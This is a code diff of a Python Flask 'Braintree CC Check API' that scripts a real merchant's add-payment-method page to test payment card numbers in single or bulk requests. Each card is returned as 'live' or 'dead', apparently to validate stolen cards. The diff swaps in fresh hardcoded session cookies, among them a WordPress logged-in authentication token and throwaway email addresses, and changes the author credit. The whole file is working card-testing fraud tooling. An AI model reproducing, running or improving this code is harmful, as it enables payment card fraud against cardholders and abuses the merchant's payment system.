@@ -10,35 +10,41 @@ import re
 
 app = Flask(__name__)
 
+def generate_random_string(length=10):
+    chars = string.ascii_letters + string.digits
+    return ''.join(random.choice(chars) for _ in range(length))
+
 def braintree_check(ccn, mm, yy, cvc):
-    """Complete Braintree CC Check with proper step validation"""
+    """Complete Braintree CC Check with proper validation"""
     
     start_time = time.time()
     
     if len(yy) == 2:
         yy = '20' + yy
 
-    # Braintree Cookies
+    # UPDATED COOKIES WITH FRESH AUTHENTICATION
     cookies = {
-        'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_first_add': 'fd%3D2025-10-24%2007%3A53%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'woocommerce_current_currency': 'GBP',
-        '_ga': 'GA1.1.1754434682.1761294191',
-        'mcforms-38097157-sessionId': '"1ffbebf3-763e-404c-ab5d-33ca3aec32e5"',
-        'nitroCachedPage': '0',
-        '_fbp': 'fb.1.1761294201465.851852551288875086',
-        'mailchimp.cart.current_email': 'zerotracehacked@gmail.com',
-        'mailchimp.cart.previous_email': 'zerotracehacked@gmail.com',
-        'mailchimp_user_email': 'zerotracehacked%40gmail.com',
-        'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'zerotracehacked%7C1762503817%7CaPBZvZMKNQ39GNn6YaincgHL96FZPoH69UyIsu5F66y%7Cbe20b116ad3799035f20dbfa310b806ab10c0ea58309c84edbb4bcc42d7d7e4b',
-        '_gcl_au': '1.1.1617797498.1761294192.1113548739.1761294203.1761294303',
-        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Mobile%20Safari%2F537.36',
-        'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method-custom',
-        '_ga_81KZY32HGV': 'GS2.1.s1761294191$o1$g1$t1761296133$j51$l0$h1737138817',
-        '_ga_0YYGQ7K779': 'GS2.1.s1761294191$o1$g1$t1761296134$j50$l0$h982637675',
+        "sbjs_migrations": "1418474375998%3D1",
+        "sbjs_current_add": "fd%3D2025-11-05%2009%3A47%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29",
+        "sbjs_first_add": "fd%3D2025-11-05%2009%3A47%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29",
+        "sbjs_current": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
+        "sbjs_first": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
+        "sbjs_udata": "vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36",
+        "_ga": "GA1.1.345696449.1762337869",
+        "nitroCachedPage": "0",
+        "mcforms-38097157-sessionId": "\"87203319-c00f-412e-8c57-fc84d7db87a5\"",
+        "woocommerce_current_currency": "GBP",
+        "_fbp": "fb.1.1762337871786.311092723121770164",
+        "mailchimp.cart.current_email": "nipiwev288@limtu.com",
+        "mailchimp.cart.previous_email": "nipiwev288@limtu.com",
+        "_gcl_au": "1.1.1038064860.1762337869.1334896359.1762337897.1762337896",
+        "mailchimp_user_email": "nipiwev288%40limtu.com",
+        "sbjs_session": "pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%3Fpassword-reset%3Dtrue",
+        "_ga_81KZY32HGV": "GS2.1.s1762337869$o1$g1$t1762337944$j48$l0$h1489784292",
+        "_ga_0YYGQ7K779": "GS2.1.s1762337869$o1$g1$t1762337944$j48$l0$h187400079",
+        
+        # ✅ FRESH WORDPRESS AUTHENTICATION COOKIE
+        "wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db": "maw04a25382C17626944742C63J7Iktsvx2EzdMhTwXGfsczM6qi1scusBMWnuLF9ZC153aef4fe17ad6218a3601358633ece76047601ab2506207b010dc01df03"
     }
 
     headers = {
@@ -59,7 +65,7 @@ def braintree_check(ccn, mm, yy, cvc):
     }
 
     try:
-        # STEP 1: GET PAYMENT PAGE (MUST SUCCEED)
+        # STEP 1: GET PAYMENT PAGE
         page_start = time.time()
         page_response = requests.get(
             'https://www.tea-and-coffee.com/account/add-payment-method-custom',
@@ -68,7 +74,6 @@ def braintree_check(ccn, mm, yy, cvc):
             timeout=15
         )
         
-        # Check if page loaded properly
         if page_response.status_code != 200:
             return "dead - page load failed"
             
@@ -78,7 +83,7 @@ def braintree_check(ccn, mm, yy, cvc):
         if time.time() - page_start < 2:
             return "dead - fast response"
         
-        # STEP 2: EXTRACT NONCES (CRITICAL STEP)
+        # STEP 2: EXTRACT NONCES
         nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', page_content)
         if not nonce_match:
             return "dead - nonce not found"
@@ -174,7 +179,7 @@ def braintree_check(ccn, mm, yy, cvc):
         if not payment_token:
             return "dead - no payment token"
 
-        # STEP 6: ADD PAYMENT METHOD (FINAL STEP)
+        # STEP 6: ADD PAYMENT METHOD
         form_headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
@@ -221,13 +226,11 @@ def braintree_check(ccn, mm, yy, cvc):
 
         response_text = payment_response.text
 
-        # FINAL VALIDATION - CHECK SUCCESS MESSAGE
+        # FINAL VALIDATION
         if 'Nice! New payment method added' in response_text or 'Payment method successfully added.' in response_text:
             total_time = time.time() - start_time
-            print(f"SUCCESS: Card processed in {total_time:.2f}s")
             return "live"  # ✅ PAYMENT METHOD SUCCESSFULLY ADDED
         else:
-            # Check for specific error messages
             if 'risk_threshold' in response_text or 'RISK_BIN' in response_text:
                 return "dead - risk threshold"
             elif 'Insufficient funds' in response_text:
@@ -244,7 +247,7 @@ def braintree_check(ccn, mm, yy, cvc):
     except Exception as e:
         return f"dead - system error"
 
-# REST OF THE API CODE REMAINS SAME...
+# API ENDPOINTS
 @app.route('/check', methods=['GET'])
 def check_cc_single():
     try:
@@ -305,7 +308,7 @@ def check_cc_bulk():
 @app.route('/', methods=['GET'])
 def home():
     return jsonify({
-        'message': 'Braintree CC Check API - By @K4LNX', 
+        'message': 'Braintree CC Check API - By @Assassin', 
         'status': 'active',
         'endpoints': {
             'single_check': '/check?cc=4111111111111111|12|2026|123',
